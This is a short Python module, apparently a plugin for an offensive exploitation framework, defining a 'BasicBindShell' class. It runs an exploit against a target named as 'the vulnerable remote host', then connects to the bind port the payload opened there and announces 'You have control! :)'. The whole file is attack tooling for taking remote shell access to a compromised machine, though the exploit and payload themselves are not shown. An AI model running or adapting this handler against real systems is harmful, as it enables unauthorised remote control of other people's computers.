
import socket
import typing
from pytoolcore import style
from pytoolcore import netutils
from core import shellcore


class BasicBindShell(shellcore.AsynchronousBasicRemoteShell):

    AUTHOR: str = "Danakane"

    def __init__(self) -> None:
        shellcore.AsynchronousBasicRemoteShell.__init__(self)
        self.customize({
            "rhost": "The vulnerable remote host",
            "rport": "The remote host port to target"
        })

    def initialize(self) -> None:
        self.exploit.run()
        self.shellskt = socket.socket(self.protocol, socket.SOCK_STREAM)
        bindport: int = self.exploit.payload.bindport
        print(style.Style.info("Trying to connect to " + self.rhost))
        try:
            bindsockaddr = netutils.getsockaddr(self.rhost, bindport)
            self.shellskt.connect(bindsockaddr)
            print(style.Style.success("You have control! :)\n"))
        except (socket.error, socket.herror, socket.gaierror, socket.timeout) as err:
            print(style.Style.error(str(err)))
            print(style.Style.failure("Failed to connect :("))


blueprint: typing.Callable = BasicBindShell
